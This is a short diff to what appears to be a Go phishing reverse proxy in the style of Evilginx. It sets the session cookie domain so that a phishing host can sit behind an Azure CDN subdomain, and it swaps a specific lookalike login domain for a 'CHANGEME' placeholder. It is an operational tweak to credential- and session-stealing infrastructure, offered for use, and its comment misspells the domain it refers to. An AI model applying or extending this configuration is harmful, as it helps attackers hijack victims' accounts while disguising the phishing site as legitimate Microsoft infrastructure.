@@ -886,6 +886,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			// handle session
+			// Below is the current fix to utilize CDN's, edit line "Domain: azureedge.ent"
 			ck := &http.Cookie{}
 			ps := ctx.UserData.(*ProxySession)
 			if ps.SessionId != "" {
@@ -894,7 +895,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						Name:    getSessionCookieName(ps.PhishletName, p.cookieName),
 						Value:   ps.SessionId,
 						Path:    "/",
-						Domain:  "xfilesrevealed-login.azureedge.net",
+						Domain:  "CHANGEME-login.azureedge.net",
 						Expires: time.Now().Add(60 * time.Minute),
 					}
 				}
